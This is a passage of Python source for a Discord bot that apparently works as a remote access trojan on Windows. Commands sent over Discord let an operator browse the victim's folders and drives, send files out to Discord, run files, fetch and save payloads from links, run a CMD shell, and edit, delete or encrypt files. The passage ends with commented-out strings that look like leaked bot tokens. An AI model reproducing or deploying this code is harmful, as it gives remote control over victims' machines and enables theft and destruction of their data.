                inp = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); inp=inp.content

                if inp == '1':
                    path = 'C:\\Users\\$USERNAME\\Desktop'
                    os.chdir(os.path.expandvars(path))
                    break

                elif inp == '2':
                    path = 'C:\\Users\\$USERNAME\\Videos'
                    os.chdir(os.path.expandvars(path))
                    break

                elif inp == '3':
                    path = 'C:\\Users\\$USERNAME\\Pictures'
                    os.chdir(os.path.expandvars(path))
                    break

                elif inp == '4':
                    path = 'C:\\Users\\$USERNAME\\Downloads'
                    os.chdir(os.path.expandvars(path))
                    break

                elif inp in drives:
                    os.chdir(inp + '\\')
                    break

                else:
                    await ctx.send('```\nEnter a correct input / drive name.\n```')

            while True:
                sleep(1)
                listdir = os.listdir(os.getcwd())
                msg_tosend2 = ''
                msg_tosend=''
                primary_message=''
                for res in listdir:
                    if os.path.isdir(res) == True:
                        if res[-1:]=='‏':
                            #---------------------Search engine---------------------#
                            msg_tosend2= msg_tosend2 + "<:emoji_11:1110625043312017458>{}".format(res) + '\n'
                            
                        else:
                            msg_tosend2=msg_tosend2 + "📁{}".format(res) + '\n'
                            
                    else:
                        
                        primary_message=primary_message+Search_Engine(res)    
                        msg_tosend=primary_message
                msg = msg_tosend2 + msg_tosend
                await advanced_send(ctx,msg)
                msg_tosend2=''
                msg_tosend=''
                primary_message=''
                sleep(0.8)
                await ctx.send('```•Exit\n•Back\n•Upload\n•Create\n•Delete\n•Rename\n•CMD\nChoose a file/folder:```')
                ress = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); res=(ress.content)
                if '>' in res: res=res.split('>')[1]
                elif '📁' in res: res=res.split('📁')[1]
                elif '📄' in res: res=res.split('📄')[1]
                elif '🌐' in res: res=res.split('🌐')[1]
                if res in os.listdir(os.getcwd()):
                    if os.path.isfile(res):
                        #--------------------Here it begins---------------------#
                        if True:
                            primary_message=primary_message+Search_Engine(res)    #Search Engine
                            msg_tosend = msg_tosend+primary_message
                            await advanced_send(ctx,msg_tosend)
                            #await ctx.send('{}'.format(msg_tosend)) 
                            try:
                                if (res[-4:]).lower()=='.png' or (res[-4:]).lower()=='.jpg' or (res[-4:]).lower()=='.ico' or (res[-4:]).lower()=='.gif' or (res[-5:]).lower()=='.jpeg' or (res[-5:]).lower()=='.tiff' or (res[-4:]).lower()=='.avi' or (res[-4:]).lower()=='.mp4' or (res[-4:]).lower()=='.mov' or (res[-4:]).lower()=='.mkv' or (res[-4:]).lower()=='.wmv' or (res[-4:]).lower()=='.flv':
                                    IS_FILE_READABLE='Else'
                                    image=res
                                else:
                                    file=open(res,'r').read();open(res,'r').close()
                                    IS_FILE_READABLE=True
                            except Exception as e:
                                try: e=(str(e).split('] ')[1]).split(':')[0]
                                except: e=(str(e).split(':')[0])
                                await ctx.send('```kotlin\n"File is unreadable"``````xml\n<Error: {}>```'.format(e))
                                IS_FILE_READABLE=False
                            if IS_FILE_READABLE=='Else':
                                await ctx.send(file=discord.File(image))
                            elif IS_FILE_READABLE==True:
                                if len(file)!=0 and len(file)<=15: await ctx.send('```{}```'.format(file))
                                elif len(file)!=0 and len(file)>15:
                                    #await ctx.send('```kotlin\n"This File exceeds 15 lines,Want to read? (Y/N)"```')
                                    msg = 'y' #await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); msg=(msg.content)
                                    if msg.lower()=='y':
                                        if len(file)!=0 and len(file)<4000:
                                            try:
                                                await ctx.send('```{}```'.format(file))
                                            except:
                                                await ctx.send('''```kotlin\n"Couldn't read the file"``````xml\n<Error: Must be 4000 or fewer in length.>```''')
                                                IS_FILE_READABLE=False
                                        else:
                                            await ctx.send('''```kotlin\n"Couldn't read the file"``````xml\n<Error: Must be 4000 or fewer in length.>```''')
                                            IS_FILE_READABLE=False
                                else: await ctx.send('```kotlin\n"File is Empty"```')
                                
                            if IS_FILE_READABLE==True:
                                sleep(0.8)
                                await ctx.send('```•Execute\n•Edit\n•Rename\n•Encrypt\n•Decrypt\n•Cut\n•Copy\n•Delete\n•Download\n•Replace\n•Back\n•Cancel\n•Exit```')
                            else:
                                sleep(0.8)
                                await ctx.send('```•Execute\n•Rename\n•Encrypt\n•Decrypt\n•Cut\n•Copy\n•Delete\n•Download\n•Replace\n•Set Wallpaper\n•Back\n•Cancel\n•Exit```')
                                                        #Rename=============================
                            while True:
                                ExitLoop=False
                                msg2 = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); msg=(msg2.content)
                                msg_tosend2=''
                                msg_tosend=''
                                primary_message=''
                                if msg.lower() == 'rename':
                                    await ctx.send("```Enter a new name: ```")
                                    new_name = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); new_name=new_name.content
                                    await ctx.send("```Enter file format (.txt/.exe/..): ```")
                                    new_format2 = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); new_format=new_format2.content
                                    ogDir = res
                                    newDir = os.getcwd() + '\\' + new_name + new_format#+ '‏' + new_format
                                    shutil.move(ogDir, newDir)
                                    await new_format2.add_reaction('{}'.format(R_Emoji))
                                    break
                            #Cut=============================
                                elif msg.lower() == 'cut':
                                    og_path = os.getcwd() + "\\" + res
                                    await ctx.send("```\nMove " + res + " to a desired location.```")

                                    while True:
                                        for x in range(len(drives)):
                                            await ctx.send('```' + drives[x] + '```')

                                        await ctx.send("```Enter your Choice: ```")
                                        inp2 = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); inp2=inp2.content

                                        if inp2 in drives:
                                            os.chdir(inp2 + '\\')
                                            break
                                        else:
                                            await ctx.send('```\nEnter a correct drive name.\n```')

                                    while True:
                                        listdir = os.listdir(os.getcwd())
                                        for res in listdir:
                                            if os.path.isdir(res) == True:
                                                if res[-1:]=='‏':
                                                    msg_tosend2= msg_tosend2 + "<:emoji_11:1110625043312017458>{}".format(res) + '\n'
                                                else:
                                                    msg_tosend2=msg_tosend2 + "📁{}".format(res) + '\n'
                                            else:
                                                 primary_message=primary_message+Search_Engine(res)    #Search Engine
                                                 msg_tosend=primary_message
                                        msg = msg_tosend2 + msg_tosend
                                        await advanced_send(ctx,msg)
                                        #await ctx.send('{}'.format(msg))
                                        msg_tosend2=''
                                        msg_tosend=''
                                        primary_message=''
                                                
                                        sleep(0.8)
                                        await ctx.send('```•Paste\n•Back\n•Cancel\n•CMD\n•Create\nChoose a file to move: ```')
                             
                                        res2 = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); res2=(res2.content)
                                        if '>' in res2: res2=res2.split('>')[1]
                                        elif '📁' in res: res=res.split('📁')[1]
                                        elif '📄' in res: res=res.split('📄')[1]
                                        elif '🌐' in res: res=res.split('🌐')[1]
                                        if res2 in os.listdir(os.getcwd()):
                                            if os.path.isfile(res2):
                                                await ctx.send("```You can't choose a file.\nPlease choose a folder.```")
                                            else:
                                                os.chdir(res2)

                                        elif res2 == 'Cancel':
                                            ExitLoop = True
                                            break
                                        elif res2 == 'Paste':
                                            try:
                                                Result=os.popen(f'move /Y "{og_path}" "{os.getcwd()}"').read()
                                                if '0' in Result:
                                                    raise Exception("xml\n<Error: Access is denied.>")
                                                ExitLoop = True
                                                break
                                            except Exception as e:
                                                await ctx.send(f'```{e}```')
                                        elif res2 == 'Back':
                                            os.chdir('..')
                                        elif res2 == 'Create':
                                            await ctx.send("```Enter New Folder's name : ```")
                                            msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); msg=(msg.content)
                                            try:
                                                os.mkdir('{}‏'.format(msg))
                                            except:
                                                await ctx.send('```Cannot create a file when that file already exists```')                   
                                        elif res2 == 'CMD':
                                            try:
                                                await cmd(ctx)
                                            except: pass
                            #Copy=============================
                                elif msg.lower() == 'copy':
                                    og_path = os.getcwd() + "\\" + res
                                    await ctx.send("```Move " + res + " to a desired location.```")

                                    while True:
                                        for x in range(len(drives)):
                                            await ctx.send('```' + drives[x] + '```')

                                        await ctx.send("```Enter your Choice: ```")
                                        inp2 = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); inp2=inp2.content

                                        if inp2 in drives:
                                            os.chdir(inp2 + '\\')
                                            break
                                        else:
                                            await ctx.send('```\nEnter a correct drive name.\n```')

                                    while True:
                                        listdir = os.listdir(os.getcwd())
                                        for res in listdir:
                                        #---------------------Search engine---------------------#
                                            if os.path.isdir(res) == True:
                                                if res[-1:]=='‏':
                                                    msg_tosend2= msg_tosend2 + "<:emoji_11:1110625043312017458>{}".format(res) + '\n'
                                                    #await ctx.send("<:emoji_11:1110625043312017458>{}".format(res))
                                                else:
                                                    msg_tosend2= msg_tosend2 + "📁{}".format(res) + '\n'
                                                    #await ctx.send("📁{}".format(res)) 
                                            else:
                                                primary_message=primary_message+Search_Engine(res)    #Search Engine
                                                msg_tosend = primary_message
                                        msg = msg_tosend2 + msg_tosend
                                        await advanced_send(ctx,msg)
                                        #await ctx.send('{}'.format(msg))
                                        msg_tosend2=''
                                        msg_tosend=''
                                        primary_message=''
                                        sleep(0.8)        
                                        await ctx.send('```•Paste\n•Back\n•Cancel\n•CMD\n•Create\nChoose a file to move: ```')
                                        res2=await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); res2=(res2.content)
                                        if '>' in res2: res2=res2.split('>')[1]
                                        elif '📁' in res: res=res.split('📁')[1]
                                        elif '📄' in res: res=res.split('📄')[1]
                                        elif '🌐' in res: res=res.split('🌐')[1]
                                        if res2 in os.listdir(os.getcwd()):
                                            if os.path.isfile(res2):
                                                await ctx.send("```You can't choose a file.\nPlease choose a folder.```")
                                            else:
                                                os.chdir(res2)

                                        elif res2 == 'Paste':
                                            try:
                                                Result=os.popen(f'move /Y "{og_path}" "{os.getcwd()}"').read()
                                                if '0' in Result:
                                                    raise Exception("xml\n<Error: Access is denied.>")
                                                ExitLoop = True
                                                break
                                            except Exception as e:
                                                await ctx.send(f'```{e}```')
                                        elif res2 == 'Cancel':
                                            ExitLoop = True
                                        elif res2 == 'Back':
                                            os.chdir('..')
                                        elif res2 == 'Create':
                                            await ctx.send("```Enter New Folder's name : ```")
                                            msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); msg=msg.content
                                            try:
                                                os.mkdir('{}‏'.format(msg))
                                            except:
                                                await ctx.send('```Cannot create a file when that file already exists```')
                                        elif res2 == 'CMD':
                                            try:
                                                await cmd(ctx)
                                            except: pass
                            #delete=============================
                                elif msg.lower() == 'delete':
                                    await ctx.send('```\n1. Permanently \n2. Recycle Bin```')
                                    msg2=await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); msg=msg2.content
                                    if msg == '1':
                                        try:
                                            os.remove(res)
                                            await msg2.add_reaction('{}'.format(R_Emoji))
                                        except:
                                            await ctx.send('```Access is denied```')
                                    if msg == '2':
                                        try:
                                            send2trash(res)
                                            await msg2.add_reaction('{}'.format(R_Emoji))
                                        except:
                                            await ctx.send('```Access is denied```')
                                    break
                            #download============================
                                elif msg.lower() == 'download':
                                    await ctx.send(file=discord.File(r'{}'.format(res)))
                            #Set Wallpaper=======================
                                elif msg.lower() == 'set wallpaper':
                                    await msg2.add_reaction('{}'.format(R_Emoji))
                            #back================================
                                elif msg.lower() == 'back':
                                    os.chdir('..')
                                    break
                            #@run+++=============================
                                elif msg.lower() =='@run':
                                    pass
                            #execute=============================
                                elif msg.lower() == 'execute':
                                    try:
                                        th.Thread(target=os.popen(res), daemon=True).start()
                                    except Exception as e:
                                        await ctx.send(f'```xml\n<Error: {e}.>```')
                                        th.Thread(target=os.popen(res), daemon=True).start()
                                        #os.system('cmd /c "{}"'.format(res))
                                    await msg2.add_reaction('{}'.format(R_Emoji))
                            #edit=============================
                                elif msg.lower() == 'edit':
                                    if IS_FILE_READABLE==True:
                                        await ctx.send('```Send your text:```')
                                        msg=await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); msg=msg.content
                                        await ctx.send('```\n1-overwrite\n2-keep old text```')
                                        msg2=await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); msg2=msg2.content
                                        if msg[:3] =='```': msg=msg[3:]
                                        if msg[-3:] =='```': msg=msg[:-3]
                                        #print(msg)
                                        if msg2=='1':
                                            with open(res,'w') as f:
                                                f.write('{}'.format(msg))
                                                f.close()
                                            break
                                        elif msg2=='2':
                                            read_old_text=open(res,'r');old_text=read_old_text.read();read_old_text.close()
                                            with open(res,'w')as f:
                                                f.write('{}\n{}'.format(old_text,msg))
                                                f.close()
                                            break
                            #replace=============================(X)
                                elif msg.lower() == 'replace':
                                    break
                                elif msg.lower() == 'encrypt':
                                    encrypt(res)
                                    await msg2.add_reaction('{}'.format(R_Emoji))
                                elif msg.lower() == 'decrypt':
                                    decrypt(res)
                                    await msg2.add_reaction('{}'.format(R_Emoji))
                            #exit=============================
                                elif msg.lower() == 'exit':
                                    LimitEntry = 0
                                    break
                            #------------------------------#
                                elif msg.lower() == 'cancel':
                                    break
                                if ExitLoop == True:
                                    break
                        #elif x[-4:]=='.lnk':
                            #await ctx.send("🌐{}".format(res))
                            #------------------------------#
                        #elif (x[-4:]).lower()=='.vbs':
                            #await ctx.send("<:emoji_6:1110594198639497267>{}".format(x)) #VBS ICON
                            #await ctx.send('```•Delete```')
                            #------------------------------#
                            
                            #------------------------------#
                        
                            #------------------------------#                        
                            #------------------------------#
                    
                    else:
                        try:
                            os.chdir(res)
                        except:
                            await ctx.send('```Access is denied```')

                elif res == 'Exit':                          # Exit command to exit from loop
                    LimitEntry = 0
                    break

                elif res == 'Back':                          # Back command to go up one directory
                    os.chdir('..')

                elif res == 'Upload':
                    await ctx.send('```Enter app link: ```')
                    link = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); link=(link.content)
                    await ctx.send("```Enter File's Name: ```")
                    name = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); name=(name.content)
                    await ctx.send("```Enter File's Formant(.txt/.exe/..): ```")
                    formate = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); form=(formate.content)
                    output = name + form
                    download(link,f'{os.getcwd()}\\{output}')
                    await formate.add_reaction('{}'.format(R_Emoji))
                    
                elif res == 'Create':
                    await ctx.send('```\n1-Folder\n2-File```')
                    answer = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); answer=(answer.content)
                    if answer == '1':
                        await ctx.send("```Enter Folder's Name: ```")
                        msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); name=(msg.content)
                        os.mkdir(os.getcwd()+f'\\{name}')
                        await msg.add_reaction('{}'.format(R_Emoji))
                    if answer == '2':
                        await ctx.send("```Enter File's Name: ```")
                        name = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); name=(name.content)
                        await ctx.send("```Enter File's Format (.txt/.bat/..): ```")
                        form = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); form=(form.content)
                        await ctx.send('```Edit The File ? (Y/N): ```')
                        choice = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); edit=(choice.content)
                        if (edit).lower() == 'yes'or (edit).lower() == 'y':
                            await ctx.send('```Enter The Content: ```')
                            cont = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); content=(cont.content)
                            with open(f'{os.getcwd()}\\{name}{form}','w') as file:
                                file.write(f'{content}'); file.close()
                            await cont.add_reaction('{}'.format(R_Emoji))
                        else:
                            with open(f'{os.getcwd()}\\{name}{form}','w') as file:
                                file.close()
                                await choice.add_reaction('{}'.format(R_Emoji))

                elif res == 'Delete':
                    await ctx.send('```Are you sure you want to delete this folder/directory? (Y/N): ```')
                    choice = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); choice=(choice.content)
                    if choice.lower() == 'y' or choice.lower() == 'yes':
                        await ctx.send('```\n1. Permanently \n2. Recycle Bin```')
                        msg2=await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); msg=msg2.content
                        if msg == '1':
                            try:
                                directory = os.getcwd()
                                os.chdir('..')
                                os.rmdir(f'{directory}')
                                await msg2.add_reaction('{}'.format(R_Emoji))
                            except:
                                await ctx.send('```Access is denied```')
                        if msg == '2':
                            try:
                                directory = os.getcwd()
                                os.chdir('..')
                                send2trash(directory)
                                await msg2.add_reaction('{}'.format(R_Emoji))
                            except:
                                await ctx.send('```Access is denied```')
                
                elif res == 'Rename':
                    await ctx.send('Enter a new name: ')
                    nam = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel); name=(nam.content)
                    directory = os.getcwd()
                    os.chdir('..')
                    os.rename(directory,name)
                    await nam.add_reaction('{}'.format(R_Emoji))

                elif res == 'CMD':
                    try:
                        await cmd(ctx)
                    except: pass
                
                else:
                    await ctx.send('```No file/folder exist of this name.```')
            else:
                await ctx.send('```You chose wrong number```')
            #await on_ready()
        else:
            LimitEntry = 0
    #await on_ready()



bot.run(f'{Token}')
#MTE4OTI3NTAwMzQ4MTQ5MzYyNQ.GMDO-Q._t8wvhxOMxF9FFxxRhbiOpYjib1mBgaHfWrE_E
#MTA5NTcwNjAyOTAwMzY1NzI5Nw.Gnd5wP.iK7yRn-E51H76Ai0eUGPZ9MaD9dE4hNlV3b-Jg